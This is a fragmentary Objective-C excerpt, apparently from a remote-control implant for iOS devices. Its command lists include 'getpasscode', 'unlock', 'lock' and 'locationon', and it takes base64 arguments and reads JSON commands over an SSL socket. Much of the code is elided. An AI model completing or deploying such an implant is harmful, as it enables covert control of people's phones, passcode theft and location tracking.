...
NSArray *rocketCommands = [[NSArray alloc]
    initWithObjects:@"play", @"pause", @"next", @"prev", @"home", @"doublehome", @"lock", @"wake",
                    @"mute", @"unmute", @"locationon", @"locationoff", nil];

NSArray *rocketReplyCommands = [[NSArray alloc]
    initWithObjects:@"ismuted", @"getpasscode", @"unlock", @"lastapp", @"islocked", nil];
...
int main(int argc, const char *argv[]) {
  NSData *argData =
      [[NSData alloc] initWithBase64EncodedString:[NSString stringWithFormat:@"%s", argv[1]]
                                          options:0];
...
void interact(NSDictionary *arguments) {
  ...
  while (SSL_read(client_ssl, buffer, sizeof(buffer))) {
    NSData *jsonData =
        [[NSString stringWithFormat:@"%s", buffer] dataUsingEncoding:NSUTF8StringEncoding];
    NSMutableDictionary *jsonDict = [NSJSONSerialization JSONObjectWithData:jsonData
                                                                    options:0
                                                                      error:NULL];
